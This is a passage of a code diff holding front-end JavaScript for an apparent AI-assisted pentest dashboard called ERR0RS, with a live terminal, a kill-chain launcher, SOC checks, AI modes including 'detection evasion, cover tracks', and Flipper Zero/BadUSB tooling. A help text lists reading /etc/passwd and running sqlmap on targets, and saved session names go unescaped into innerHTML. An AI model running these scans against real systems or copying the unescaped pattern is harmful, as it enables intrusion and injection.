+      addIntel('ERR0RS', msg.data.substring(0,120), 'info');
+      break;
+    case 'suggestion':
+      // Next-best-step card — CLICKABLE
+      addSuggestionCard(msg);
+      break;
+    case 'teach_block':
+      ltpWrite('', 'output');
+      ltpWrite(msg.data, 'teach-block');
+      ltpWrite('', 'output');
+      addIntel('[ERR0RS LESSON]', 'Lesson loaded — see live terminal', 'info');
+      break;
+    case 'system':
+      ltpWrite(msg.data, 'system');
+      break;
+    case 'error':
+      ltpWrite('[ERROR] ' + msg.data, 'error');
+      addIntel('TERMINAL ERROR', msg.data, 'error');
+      break;
+    case 'done':
+      ltpWrite(msg.data, 'system');
+      ltpWrite('─'.repeat(54), 'system');
+      ltpBadge.textContent = '⬤ READY';
+      ltpBadge.className   = 'ltp-badge live';
+      break;
+    case 'xp_award':
+      try {
+        const xd = JSON.parse(msg.data);
+        if (typeof showXPToast !== 'undefined')
+          showXPToast(xd.xp_gained||0, xd.level_up||false, (xd.new_level||{}).name||'');
+      } catch(e) {}
+      break;
+    case 'input_echo':
+      ltpWrite('>> ' + msg.data, 'system');
+      break;
+    case 'coach':
+      // ERR0RS Auto Coach — analysis block after tool completion
+      renderCoachBlock(msg.result || {}, msg.data || '', msg.tool || '');
+      break;
+    case 'chat_token':
+      // Streaming LLM response — append tokens to chat panel
+      appendChatToken(msg.data);
+      break;
+    case 'chat_done':
+      // LLM finished — finalize the chat bubble
+      finalizeChatBubble();
+      break;
+    default:
+      if (msg.data) ltpWrite(msg.data, 'output');
+  }
+  ltpScrollBottom();
+}
+
+function ltpWrite(text, cls = 'output') {
+  const lines = String(text).split('\n');
+  lines.forEach(line => {
+    const div = document.createElement('div');
+    div.className = `ltp-line ${cls}`;
+    div.textContent = line;
+    ltpOutput.appendChild(div);
+  });
+  // Keep output trimmed to 500 lines for performance
+  while (ltpOutput.children.length > 500) ltpOutput.removeChild(ltpOutput.firstChild);
+}
+
+function ltpScrollBottom() {
+  ltpOutput.scrollTop = ltpOutput.scrollHeight;
+}
+
+function openLiveTerm() {
+  ltpPanel.classList.add('active');
+  document.getElementById('bottom-bar').style.marginBottom = '45vh';
+  discoverWS().then(() => connectWS());
+  ltpInput.focus();
+}
+
+// ─── KILL CHAIN LAUNCHER ──────────────────────────────────────────────────
+async function launchKillChain() {
+  const target = (document.getElementById('kc-target').value || 'localhost:3000').trim();
+  const statusEl = document.getElementById('kc-status');
+
+  openLiveTerm();
+  await new Promise(r => setTimeout(r, 700));
+
+  statusEl.textContent = '⏳ Running…';
+  statusEl.style.color = 'var(--amber)';
+
+  ltpWrite('', 'system');
+  ltpWrite('══════════════════════════════════════════════════════', 'system');
+  ltpWrite(`  🔥  ERR0RS KILL CHAIN  //  TARGET: ${target}`, 'system');
+  ltpWrite('══════════════════════════════════════════════════════', 'system');
+  ltpWrite('  Phases: recon → scanning → exploitation', 'system');
+  ltpWrite('  Output streams live below as each tool runs.', 'system');
+  ltpWrite('══════════════════════════════════════════════════════', 'system');
+  ltpWrite('', 'system');
+  addIntel('KILL CHAIN', `Starting against ${target}`, 'info');
+
+  try {
+    const resp = await fetch('/api/killchain/run', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({target})
+    });
+    if (!resp.ok) {
+      const err = await resp.text();
+      ltpWrite(`[ERR0RS] ❌ Kill chain HTTP ${resp.status}: ${err.substring(0,200)}`, 'error');
+      statusEl.textContent = `❌ HTTP ${resp.status}`;
+      statusEl.style.color = 'var(--red)';
+      return;
+    }
+    const data = await resp.json();
+    const results = data.results || [];
+    const ok = results.filter(r => r.success).length;
+
+    ltpWrite('', 'system');
+    ltpWrite(`  ✅ Kill chain complete — ${ok}/${results.length} tools succeeded`, 'system');
+    ltpWrite('  Type: report juice-shop   to generate full HTML report', 'system');
+    statusEl.textContent = `✅ ${ok}/${results.length} done`;
+    statusEl.style.color = 'var(--green)';
+    addIntel('KILL CHAIN DONE', `${ok}/${results.length} tools succeeded`, 'info');
+
+  } catch(e) {
+    ltpWrite(`[ERR0RS] ❌ Kill chain error: ${e.message}`, 'error');
+    statusEl.textContent = `❌ Error`;
+    statusEl.style.color = 'var(--red)';
+    addIntel('KILL CHAIN ERROR', e.message, 'error');
+  }
+}
+
+// ─── ERR0RS OPERATOR CHAT ─────────────────────────────────────────────────
+async function sendToOperator(msg) {
+  const input = document.getElementById('op-chat-input');
+  const text = (msg || input.value || '').trim();
+  if (!text) return;
+
+  input.value = '';
+  // Open live terminal so the user sees ERR0RS's narration + tool output
+  if (!ltpPanel.classList.contains('active')) openLiveTerm();
+
+  // Echo the operator's message into the live terminal
+  ltpWrite('', 'system');
+  ltpWrite(`» ${text}`, 'user-input');
+  addIntel('OPERATOR', text, 'info');
+
+  try {
+    const resp = await fetch('/api/operator/receive', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({msg: text})
+    });
+    if (!resp.ok) {
+      const body = await resp.text();
+      ltpWrite(`[ERR0RS] HTTP ${resp.status}: ${body.substring(0,200)}`, 'error');
+      return;
+    }
+    const data = await resp.json();
+
+    // Update mode badge if state returned
+    if (data.state && data.state.mode) {
+      const badge = document.getElementById('op-mode-badge');
+      badge.textContent = data.state.mode.toUpperCase();
+      badge.style.color = data.state.mode === 'auto' ? 'var(--amber)'
+                        : data.state.mode === 'paused' ? 'var(--red)'
+                        : 'var(--text-dim)';
+    }
+
+    // Reply is usually already broadcast via WS, but show a short echo
+    if (data.reply && !data.findings) {
+      ltpWrite(`[ERR0RS] ${data.reply}`, 'narrator');
+    }
+  } catch(e) {
+    ltpWrite(`[ERR0RS] Chat error: ${e.message}`, 'error');
+    addIntel('OPERATOR ERROR', e.message, 'error');
+  }
+}
+
+// Wire Enter key on the operator chat input
+window.addEventListener('DOMContentLoaded', () => {
+  const opInput = document.getElementById('op-chat-input');
+  if (opInput) {
+    opInput.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter' && !e.shiftKey) {
+        e.preventDefault();
+        sendToOperator();
+      }
+    });
+  }
+  // Poll state every 3s to keep mode badge fresh
+  setInterval(async () => {
+    try {
+      const r = await fetch('/api/operator/state');
+      if (!r.ok) return;
+      const s = await r.json();
+      const badge = document.getElementById('op-mode-badge');
+      const pauseBtn = document.getElementById('op-pause-btn');
+      if (badge && s.mode) {
+        badge.textContent = s.mode.toUpperCase();
+        badge.style.color = s.mode === 'auto' ? 'var(--amber)'
+                          : s.mode === 'paused' ? 'var(--red)'
+                          : 'var(--text-dim)';
+      }
+      if (pauseBtn) {
+        // Show pause only in AUTO, show RESUME in PAUSED, hide in MANUAL
+        if (s.mode === 'auto') {
+          pauseBtn.style.display = '';
+          pauseBtn.innerHTML = '⏸ PAUSE';
+          pauseBtn.style.color = 'var(--amber)';
+          pauseBtn.style.borderColor = 'var(--amber)';
+        } else if (s.mode === 'paused') {
+          pauseBtn.style.display = '';
+          pauseBtn.innerHTML = '▶ RESUME';
+          pauseBtn.style.color = 'var(--green)';
+          pauseBtn.style.borderColor = 'var(--green)';
+        } else {
+          pauseBtn.style.display = 'none';
+        }
+      }
+    } catch {}
+  }, 3000);
+});
+
+function closeLiveTerm() {
+  ltpPanel.classList.remove('active');
+  document.getElementById('bottom-bar').style.marginBottom = '0';
+  ltpPanel.classList.remove('active');
+  document.getElementById('bottom-bar').style.marginBottom = '0';
+}
+
+function toggleTeachMode() {
+  teachMode = !teachMode;
+  const btn = document.getElementById('btn-teach-toggle');
+  if (teachMode) {
+    btn.textContent = '📚 TEACH ON';
+    btn.classList.add('on');
+    ltpTeachInd.style.display = 'block';
+    ltpWrite('[ERR0RS] TEACH MODE ON — I will explain results as they come in.', 'system');
+  } else {
+    btn.textContent = '📚 TEACH OFF';
+    btn.classList.remove('on');
+    ltpTeachInd.style.display = 'none';
+    ltpWrite('[ERR0RS] TEACH MODE OFF — raw output only.', 'system');
+  }
+}
+
+function sendCtrlC() {
+  if (ws && wsConnected) {
+    ws.send(JSON.stringify({ type: 'key', data: '\x03' }));
+    ltpWrite('[ERR0RS] Sent Ctrl+C', 'system');
+  }
+}
+
+// Live terminal input handler
+ltpInput.addEventListener('keydown', async (e) => {
+  if (e.key !== 'Enter') return;
+  const raw = ltpInput.value.trim();
+  if (!raw) return;
+  ltpInput.value = '';
+
+  // Echo the command
+  ltpWrite(`ERR0RS@kali:~$ ${raw}`, 'system');
+
+  // Special local commands
+  if (raw === 'clear' || raw === 'cls') {
+    ltpOutput.innerHTML = '';
+    return;
+  }
+  if (raw === 'help') {
+    ltpWrite([
+      '══════════════════════════════════════',
+      ' ERR0RS LIVE TERMINAL — COMMAND GUIDE',
+      '══════════════════════════════════════',
+      ' TOOL EXECUTION (natural language):',
+      '   nmap 192.168.1.1                  run nmap',
+      '   scan 192.168.1.0/24              network sweep',
+      '   run sqlmap on http://target.com   SQLi test',
+      '   run gobuster against target.com   dir bust',
+      '',
+      ' TEACH MODE (add --teach or toggle button):',
+      '   nmap 192.168.1.1 --teach          run + explain',
+      '   teach me sqlmap                   offline lesson',
+      '   explain privilege escalation      concept lesson',
+      '',
+      ' INTERACTIVE (type INTO running tool):',
+      '   When msfconsole is running, just type MSF commands',
+      '   When sqlmap asks a question, type your answer',
+      '   Ctrl+C button stops any running tool',
+      '',
+      ' RAW SHELL:',
+      '   $ whoami     $ ip addr     $ ls -la',
+      '   $ cat /etc/passwd   $ netstat -tulpn',
+      '══════════════════════════════════════',
+    ].join('\n'), 'teach-block');
+    return;
+  }
+
+  // If WebSocket connected → send to live terminal
+  if (ws && wsConnected) {
+    // Determine if this is stdin to running process or a new command
+    // If the prompt shows a tool is running, treat as stdin
+    const isRunning = ltpBadge.textContent.includes('RUNNING');
+    if (isRunning) {
+      ws.send(JSON.stringify({ type: 'stdin', data: raw }));
+    } else {
+      ws.send(JSON.stringify({
+        type:    'run',
+        command: raw,
+        teach:   teachMode || raw.includes('--teach')
+      }));
+      ltpBadge.textContent = '⬤ RUNNING';
+      ltpBadge.className   = 'ltp-badge live';
+      // ERR0RS reacts
+      speechEl.style.opacity = 0;
+      setTimeout(() => { speechEl.textContent = `⚡ Running: ${raw.substring(0,40)}...`; speechEl.style.opacity = 1; }, 200);
+    }
+  } else {
+    // WS not connected — fall back to HTTP command API
+    ltpWrite('[ERR0RS] Live terminal offline — using HTTP fallback...', 'system');
+    try {
+      const res = await fetch('/api/command', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({command: raw})
+      });
+      const data = await res.json();
+      const out = data.stdout || data.error || 'No output';
+      ltpWrite(out, 'output');
+    } catch(err) {
+      ltpWrite(`[ERR0RS] HTTP fallback failed: ${err.message}`, 'error');
+    }
+  }
+});
+
+// ─────────────────────────────────────────────
+// TARGET MODAL — pops up when a tool button is clicked
+// ─────────────────────────────────────────────
+let _pendingTool = null;
+
+function showTargetModal(toolName, defaultPlaceholder) {
+  _pendingTool = toolName;
+  const modal = document.getElementById('target-modal');
+  const inp   = document.getElementById('target-modal-input');
+  const lbl   = document.getElementById('target-modal-label');
+  lbl.textContent = `Enter target for ${toolName.toUpperCase()}:`;
+  inp.value = '';
+  inp.placeholder = defaultPlaceholder || 'e.g. 192.168.1.1 or http://target.com';
+  modal.style.display = 'flex';
+  setTimeout(() => inp.focus(), 80);
+}
+
+function closeTargetModal() {
+  document.getElementById('target-modal').style.display = 'none';
+  _pendingTool = null;
+}
+
+function submitTargetModal() {
+  const inp    = document.getElementById('target-modal-input');
+  const target = inp.value.trim();
+  if (!target) { inp.focus(); return; }
+  closeTargetModal();
+  if (!_pendingTool) return;
+  const cmd = `${_pendingTool} ${target}`;
+
+  // Open live terminal and fire the command
+  if (!ltpPanel.classList.contains('active')) { openLiveTerm(); }
+  setTimeout(() => {
+    ltpWrite(`ERR0RS@kali:~$ ${cmd}`, 'system');
+    if (ws && wsConnected) {
+      ws.send(JSON.stringify({ type: 'run', command: cmd, teach: teachMode }));
+      ltpBadge.textContent = '⬤ RUNNING';
+      ltpBadge.className   = 'ltp-badge live';
+      speechEl.style.opacity = 0;
+      setTimeout(() => { speechEl.textContent = `⚡ Running: ${cmd.substring(0,45)}...`; speechEl.style.opacity = 1; }, 200);
+    } else {
+      ltpWrite('[ERR0RS] Connecting to live terminal...', 'system');
+      discoverWS().then(() => {
+        connectWS();
+        setTimeout(() => {
+          if (ws && wsConnected) {
+            ws.send(JSON.stringify({ type: 'run', command: cmd, teach: teachMode }));
+          } else {
+            // HTTP fallback
+            fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'},
+              body: JSON.stringify({command: cmd}) })
+              .then(r => r.json())
+              .then(d => { ltpWrite(d.stdout || d.error || 'No output','output'); })
+              .catch(err => ltpWrite(`[ERR0RS] HTTP error: ${err.message}`,'error'));
+          }
+        }, 1200);
+      });
+    }
+  }, 600);
+}
+
+// ─────────────────────────────────────────────
+// DYNAMIC BOOT STATUS FEED
+// Pulls /api/status on page load and populates
+// the intel feed with real hardware/engine info
+// ─────────────────────────────────────────────
+async function bootStatusFeed() {
+  try {
+    const s = await fetch('/api/status').then(r => r.json());
+    document.getElementById('intel-feed').innerHTML = '';
+
+    const engines = Object.entries(s)
+      .filter(([k, v]) => k.endsWith('_engine') && v === true)
+      .map(([k]) => k.replace('_engine', '').toUpperCase())
+      .join(' // ');
+
+    const hw      = s.platform    || 'Unknown hardware';
+    const npuLine = s.hailo_npu   ? `Hailo-10H NPU active // ${s.hailo_status}`
+                                  : `Hailo NPU: ${s.hailo_status || 'not ready'}`;
+    const models  = s.ollama_models && s.ollama_models.length
+                    ? s.ollama_models.join(', ')
+                    : 'No models loaded';
+    const flipper = s.flipper_engine ? 'Flipper Zero: connected' : 'Flipper Zero: not detected';
+    const ws      = s.websocket      ? `WebSocket: :${s.ws_port}` : 'WebSocket: disabled';
+
+    // ── Update Hailo NPU pill ─────────────────────────────────────────────
+    _updateHailoPill(s.hailo_npu, s.hailo_status);
+
+    addIntel('◉ AWAITING TARGET',   'No active engagement. Use tool grid or terminal.', '');
+    addIntel('🔌 CONNECTIVITY',     `${flipper} // ${ws}`, 'info');
+    addIntel('⚡ ENGINES ONLINE',   engines || 'None loaded', 'info');
+    addIntel('🤖 OLLAMA',           models, s.ollama ? 'ok' : 'warn');
+    addIntel('◈ HARDWARE DETECTED', `${hw} // ${npuLine}`, 'info');
+    addIntel('✅ SYSTEM ONLINE',    `ERR0RS v${s.version || '3.0'} // uptime ${s.uptime}`, 'ok');
+  } catch (e) {
+    document.getElementById('intel-feed').innerHTML = '';
+    addIntel('⚠ BACKEND OFFLINE',
+      'Cannot reach ERR0RS server. Run: python3 src/ui/errorz_launcher.py', 'crit');
+  }
+}
+
+// ── Hailo NPU pill updater ────────────────────────────────────────────────────
+function _updateHailoPill(online, statusText) {
+  const pill = document.getElementById('hailo-pill');
+  if (!pill) return;
+  if (online) {
+    pill.style.opacity     = '1';
+    pill.style.borderColor = 'var(--neon)';
+    pill.style.color       = 'var(--neon)';
+    pill.style.background  = 'rgba(191,111,255,0.15)';
+    pill.style.animation   = 'pulse-pill 2s infinite';
+    pill.title             = `Hailo-10H ONLINE — ${statusText || 'firmware 5.1.1'}`;
+    pill.innerHTML         = '⬡ HAILO NPU ●';
+  } else {
+    pill.style.opacity     = '0.3';
+    pill.style.borderColor = '';
+    pill.style.animation   = 'none';
+    pill.title             = `Hailo NPU offline — ${statusText || 'module not loaded'}. Click to recheck.`;
+    pill.innerHTML         = '⬡ HAILO NPU';
+  }
+}
+
+// ── Manual NPU status check (click the pill) ─────────────────────────────────
+async function checkHailoStatus() {
+  const pill = document.getElementById('hailo-pill');
+  if (pill) { pill.innerHTML = '⬡ CHECKING...'; pill.style.opacity = '0.6'; }
+  try {
+    const r = await fetch('/api/hailo', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ action: 'detect' }),
+    });
+    const d = await r.json();
+    const det = d.detection || d;
+    const online = det.hailo_found && det.hailortcli;
+    const fw     = det.firmware_version || 'unknown fw';
+    _updateHailoPill(online, online ? `fw ${fw} | ${det.chip}` : det.error || 'not responding');
+    addIntel(
+      online ? '⬡ HAILO-10H ONLINE' : '⬡ HAILO NPU CHECK',
+      online
+        ? `Chip: ${det.chip} | Firmware: ${fw} | Module: ${det.driver_module} | Device: ${det.device_node ? '/dev/hailo0 ✓' : 'no device node'}`
+        : `Status: ${det.error || 'not detected'} | PCI: ${det.pcie_detected ? 'detected' : 'not found'}`,
+      online ? 'ok' : 'warn'
+    );
+  } catch(e) {
+    if (pill) { pill.innerHTML = '⬡ HAILO NPU'; pill.style.opacity = '0.3'; }
+    addIntel('⬡ HAILO CHECK FAILED', e.message, 'error');
+  }
+}
+
+// Allow Enter key in modal
+document.addEventListener('DOMContentLoaded', () => {
+  const inp = document.getElementById('target-modal-input');
+  if (inp) inp.addEventListener('keydown', e => { if(e.key==='Enter') submitTargetModal(); if(e.key==='Escape') closeTargetModal(); });
+  // Boot the live status feed
+  bootStatusFeed();
+});
+
+// ─────────────────────────────────────────────
+// SOC BLUE TEAM TOOLS — quick-action buttons
+// ─────────────────────────────────────────────
+async function socAction(action) {
+  if (!ltpPanel.classList.contains('active')) { openLiveTerm(); }
+  const cmds = {
+    'ioc-lookup':    '$ echo "IOC lookup — enter hash/IP/domain in terminal"',
+    'log-tail':      '$ tail -f /var/log/auth.log /var/log/syslog 2>/dev/null || journalctl -f',
+    'active-conns':  '$ ss -tulpn && netstat -an | grep ESTABLISHED',
+    'who-online':    '$ who && last | head -20 && w',
+    'failed-logins': '$ grep "Failed password" /var/log/auth.log | tail -30 2>/dev/null || journalctl _SYSTEMD_UNIT=sshd | grep Failed | tail -30',
+    'running-procs': '$ ps aux --sort=-%cpu | head -30',
+    'open-ports':    '$ ss -tulpn | grep LISTEN',
+    'firewall-rules':'$ iptables -L -n -v 2>/dev/null || ufw status verbose',
+    'dns-cache':     '$ resolvectl statistics 2>/dev/null || cat /etc/hosts',
+    'cron-jobs':     '$ crontab -l 2>/dev/null; ls -la /etc/cron*',
+    'sudo-log':      '$ grep sudo /var/log/auth.log | tail -20 2>/dev/null || journalctl | grep sudo | tail -20',
+    'volatility':    '$ volatility --info 2>/dev/null || echo "volatility3 not found — apt install volatility3"',
+  };
+  const cmd = cmds[action] || `$ echo "Unknown action: ${action}"`;
+  ltpWrite(`ERR0RS@kali:~$ ${cmd.slice(2)}`, 'system');
+  addIntel(`SOC ACTION: ${action.toUpperCase()}`, 'Executing blue team check...', 'info');
+  if (ws && wsConnected) {
+    ws.send(JSON.stringify({ type: 'run', command: cmd, teach: false }));
+    ltpBadge.textContent = '⬤ RUNNING';
+    ltpBadge.className   = 'ltp-badge live';
+  } else {
+    try {
+      const r = await fetch('/api/shell', { method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({cmd: cmd.slice(2), timeout: 30}) });
+      const d = await r.json();
+      ltpWrite(d.stdout || d.error || 'No output', 'output');
+    } catch(e) { ltpWrite(`[ERR0RS] SOC action failed: ${e.message}`, 'error'); }
+  }
+}
+
+// ─────────────────────────────────────────────
+// IMAGE PATH — copy your ERR0RS photo to src/ui/web/errz-bg.jpg
+// ─────────────────────────────────────────────
+
+// ─────────────────────────────────────────────
+// TEAM MODE SELECTOR
+// Switches between Red / Blue / Purple team
+// Dims irrelevant tool buttons, shows mode banner
+// ─────────────────────────────────────────────
+let currentMode = 'red';
+
+function setTeamMode(mode) {
+  currentMode = mode;
+
+  // Update button active states
+  ['red','blue','purple'].forEach(m => {
+    document.getElementById(`tm-${m}`).classList.toggle('active', m === mode);
+  });
+
+  // Apply body class for CSS tool dim/highlight
+  document.body.className = document.body.className
+    .replace(/mode-\w+/g,'').trim() + ` mode-${mode}`;
+
+  // Show banner
+  const banner = document.getElementById('mode-banner');
+  const labels = {
+    red:    '🔴 RED TEAM MODE — OFFENSIVE OPERATIONS ACTIVE',
+    blue:   '🔵 BLUE TEAM MODE — DEFENSE & DETECTION ACTIVE',
+    purple: '🟣 PURPLE TEAM MODE — FULL ATTACK-DETECT-REMEDIATE LOOP',
+  };
+  banner.textContent = labels[mode];
+  banner.className = `visible ${mode}`;
+  setTimeout(() => { banner.classList.remove('visible'); }, 3500);
+
+  // Update speech bubble
+  const modeMsg = {
+    red:    'Red Team mode active. Offensive tools highlighted.',
+    blue:   'Blue Team mode active. Defense and detection tools highlighted.',
+    purple: 'Purple Team mode active. Running full attack-detect-remediate loop.',
+  };
+  speechEl.style.opacity = 0;
+  setTimeout(() => { speechEl.textContent = modeMsg[mode]; speechEl.style.opacity = 1; }, 200);
+
+  addIntel(`MODE: ${mode.toUpperCase()} TEAM`, labels[mode], mode === 'red' ? 'error' : mode === 'blue' ? 'info' : 'ok');
+}
+
+// ─────────────────────────────────────────────
+// ERRZ BRAIN — Native AI with mode picker
+// ─────────────────────────────────────────────
+async function launchERRZBrain(btnEl) {
+  launchTool(btnEl, 'ai', '🧠', 'ERR0RS Brain online — 7 modes, zero cloud dependency.');
+
+  const modes = [
+    {key:'kali',        label:'⚡ KaliMode',        desc:'Fast pentest Q&A, exact commands'},
+    {key:'red_team',    label:'🔴 RedTeamMode',      desc:'Attack chain planning, MITRE mapping'},
+    {key:'vuln_hunter', label:'🎯 VulnHunterMode',   desc:'CVE analysis, PoC code, exploit research'},
+    {key:'threat_intel',label:'🕵️ ThreatIntelMode',  desc:'IOC analysis, adversary TTPs'},
+    {key:'opsec',       label:'🕶️ OPSECMode',        desc:'Detection evasion, cover tracks'},
+    {key:'purple_team', label:'🟣 PurpleTeamMode',   desc:'Full Red+Blue+Remediate loop'},
+    {key:'rag_analyst', label:'🧠 RAGAnalystMode',   desc:'CVE/ATT&CK/Sigma knowledge queries'},
+  ];
+
+  const modesHtml = modes.map(m =>
+    `<div onclick="askBrain('${m.key}')" style="cursor:pointer;padding:8px 12px;margin:4px 0;
+      border:1px solid var(--border);border-radius:6px;background:var(--deep);
+      transition:border-color .15s;" onmouseover="this.style.borderColor='var(--neon)'"
+      onmouseout="this.style.borderColor='var(--border)'">
+      <div style="color:var(--neon);font-size:.7rem;font-weight:700;">${m.label}</div>
+      <div style="color:var(--text-dim);font-size:.6rem;">${m.desc}</div>
+    </div>`
+  ).join('');
+
+  addIntel('🧠 ERRZ BRAIN MODES', modesHtml.replace(/<[^>]+>/g, ' ').replace(/\s+/g,' '), 'info');
+
+  if (!ltpPanel.classList.contains('active')) openLiveTerm();
+  ltpWrite('══════════════════════════════════════', 'system');
+  ltpWrite('  ERR0RS NATIVE AI BRAIN — 7 MODES   ', 'system');
+  ltpWrite('══════════════════════════════════════', 'system');
+  modes.forEach(m => ltpWrite(`  ${m.label.padEnd(20)} ${m.desc}`, 'teach'));
+  ltpWrite('──────────────────────────────────────', 'system');
+  ltpWrite('Type: brain <mode> <your question>', 'system');
+  ltpWrite('e.g.: brain purple_team simulate a persistence attack', 'system');
+  ltpWrite('e.g.: brain rag_analyst lookup CVE-2021-44228', 'system');
+  ltpWrite('══════════════════════════════════════', 'system');
+}
+
+async function askBrain(mode) {
+  const prompt = window.prompt(`Ask ERR0RS Brain [${mode}]:`);
+  if (!prompt) return;
+  if (!ltpPanel.classList.contains('active')) openLiveTerm();
+  ltpWrite(`ERR0RS@kali:~$ brain ${mode} ${prompt}`, 'system');
+  try {
+    const res = await fetch('/api/brain', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({action:'ask', prompt, mode})
+    });
+    const d = await res.json();
+    const out = d.stdout || d.error || 'No response';
+    ltpWrite(out, mode === 'purple_team' ? 'teach-block' : 'teach');
+    addIntel(`🧠 BRAIN [${mode.toUpperCase()}]`, out.substring(0,120)+'...', 'info');
+  } catch(e) {
+    ltpWrite(`[ERR0RS] Brain API error: ${e.message}`, 'error');
+  }
+}
+
+// ─────────────────────────────────────────────
+// FLIPPER STUDIO LAUNCHER
+// ─────────────────────────────────────────────
+async function launchFlipperStudio(btnEl) {
+  launchTool(btnEl, 'flipper', '🐬', 'Flipper Zero Studio loading — RF, NFC, IR, BadUSB ready.');
+  if (!ltpPanel.classList.contains('active')) openLiveTerm();
+  try {
+    const res = await fetch('/api/flipper', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({action:'status'})
+    });
+    const d = await res.json();
+    if (d.status === 'ok' || d.categories) {
+      const cats = d.categories || {};
+      const catLines = Object.entries(cats).map(([k,v]) => `  ${k}: ${v} scripts`).join('\n');
+      ltpWrite('═══════════ FLIPPER ZERO STUDIO ═══════════', 'system');
+      ltpWrite(`Total scripts: ${d.total || 'N/A'}`, 'teach');
+      ltpWrite(catLines, 'teach');
+      ltpWrite('Commands: flipper <prompt> | flipper search <q> | flipper portals', 'system');
+      ltpWrite('═══════════════════════════════════════════', 'system');
+    } else {
+      ltpWrite('[ERR0RS] Flipper Studio: ' + (d.error || 'Module loading'), 'system');
+    }
+    addIntel('🐬 FLIPPER STUDIO', 'BadUSB / RF / NFC / IR toolkit loaded', 'ok');
+  } catch(e) {
+    ltpWrite(`[ERR0RS] Flipper Studio unavailable: ${e.message}`, 'error');
+  }
+}
+
+// ─────────────────────────────────────────────
+// BAS ENGINE LAUNCHER (Breach and Attack Simulation)
+// ─────────────────────────────────────────────
+async function launchBAS(btnEl) {
+  launchTool(btnEl, 'bas', '🎯', 'Breach and Attack Simulation engine online. Simulating TTPs...');
+  if (!ltpPanel.classList.contains('active')) openLiveTerm();
+  try {
+    const res = await fetch('/api/bas', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({action:'list_scenarios'})
+    });
+    const d = await res.json();
+    ltpWrite('═══════════ BAS ENGINE — SCENARIOS ════════', 'system');
+    if (d.scenarios) {
+      d.scenarios.slice(0,10).forEach(s =>
+        ltpWrite(`  [${(s.id||'').padEnd(6)}] ${s.name||s.id} — ${s.description||''}`, 'teach')
+      );
+    } else {
+      ltpWrite(JSON.stringify(d, null, 2).substring(0,400), 'teach');
+    }
+    ltpWrite('Type: $ python3 -m src.tools.breach.bas_engine', 'system');
+    ltpWrite('═══════════════════════════════════════════', 'system');
+    addIntel('🎯 BAS ENGINE', 'Breach simulation scenarios loaded', 'ok');
+  } catch(e) {
+    ltpWrite(`[ERR0RS] BAS Engine unavailable: ${e.message}`, 'error');
+  }
+}
+
+// ─────────────────────────────────────────────
+// COMPLIANCE MAPPER LAUNCHER
+// ─────────────────────────────────────────────
+async function launchCompliance(btnEl) {
+  launchTool(btnEl, 'compliance', '📜', 'Compliance mapper online — SOC2, PCI-DSS, HIPAA, NIST ready.');
+  if (!ltpPanel.classList.contains('active')) openLiveTerm();
+  try {
+    const res = await fetch('/api/compliance', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({action:'list_frameworks'})
+    });
+    const d = await res.json();
+    ltpWrite('════════ COMPLIANCE MAPPER — FRAMEWORKS ════', 'system');
+    if (d.frameworks) {
+      d.frameworks.forEach(f => ltpWrite(`  [${(f.id||f).padEnd(10)}] ${f.name||f}`, 'teach'));
+    } else {
+      ltpWrite(JSON.stringify(d, null, 2).substring(0,400), 'teach');
+    }
+    ltpWrite('Type: compliance <framework> <finding>', 'system');
+    ltpWrite('e.g.: compliance pci "open port 3306 on internet-facing host"', 'system');
+    ltpWrite('════════════════════════════════════════════', 'system');
+    addIntel('📜 COMPLIANCE MAPPER', 'Frameworks loaded: SOC2, PCI-DSS, HIPAA, NIST, CIS', 'ok');
+  } catch(e) {
+    ltpWrite(`[ERR0RS] Compliance mapper unavailable: ${e.message}`, 'error');
+  }
+}
+
+// ─────────────────────────────────────────────
+// SESSION MANAGER
+// ─────────────────────────────────────────────
+function toggleSessionMenu() {
+  const m = document.getElementById('session-menu');
+  if (m.style.display === 'none' || !m.style.display) {
+    m.style.display = 'block';
+    refreshSessionList();
+  } else {
+    m.style.display = 'none';
+  }
+}
+
+function saveSession() {
+  const name = document.getElementById('sm-name').value.trim() || `session_${Date.now()}`;
+  const session = {
+    name,
+    timestamp: new Date().toISOString(),
+    intel: document.getElementById('intel-feed').innerHTML,
+    ltpOutput: document.getElementById('ltp-output').innerHTML,
+  };
+  const sessions = JSON.parse(localStorage.getItem('errz_sessions') || '[]');
+  sessions.unshift(session);
+  if (sessions.length > 20) sessions.pop();
+  localStorage.setItem('errz_sessions', JSON.stringify(sessions));
+  document.getElementById('sm-name').value = '';
+  refreshSessionList();
+  addIntel('💾 SESSION SAVED', `"${name}" saved successfully`, 'ok');
+}
+
+function refreshSessionList() {
+  const sessions = JSON.parse(localStorage.getItem('errz_sessions') || '[]');
+  const list = document.getElementById('sm-list');
+  if (!sessions.length) {
+    list.innerHTML = '<div class="sm-empty">No saved sessions</div>';
+    return;
+  }
+  list.innerHTML = sessions.map((s, i) => `
+    <div class="sm-session-item">
+      <span class="sm-session-name">${s.name}</span>
+      <span class="sm-session-meta">${new Date(s.timestamp).toLocaleDateString()}</span>
+      <span class="sm-session-load" onclick="loadSession(${i})">LOAD</span>
+      <span class="sm-session-del"  onclick="deleteSession(${i})">✕</span>
+    </div>
+  `).join('');
+}
+
+function loadSession(i) {
+  const sessions = JSON.parse(localStorage.getItem('errz_sessions') || '[]');
+  const s = sessions[i];
+  if (!s) return;
+  document.getElementById('intel-feed').innerHTML = s.intel || '';
+  if (s.ltpOutput) document.getElementById('ltp-output').innerHTML = s.ltpOutput;
+  document.getElementById('session-menu').style.display = 'none';
+  addIntel('📂 SESSION LOADED', `Restored: "${s.name}"`, 'ok');
+}
+
+function deleteSession(i) {
+  const sessions = JSON.parse(localStorage.getItem('errz_sessions') || '[]');
+  sessions.splice(i, 1);
+  localStorage.setItem('errz_sessions', JSON.stringify(sessions));
+  refreshSessionList();
+}
+
+function exportSession() {
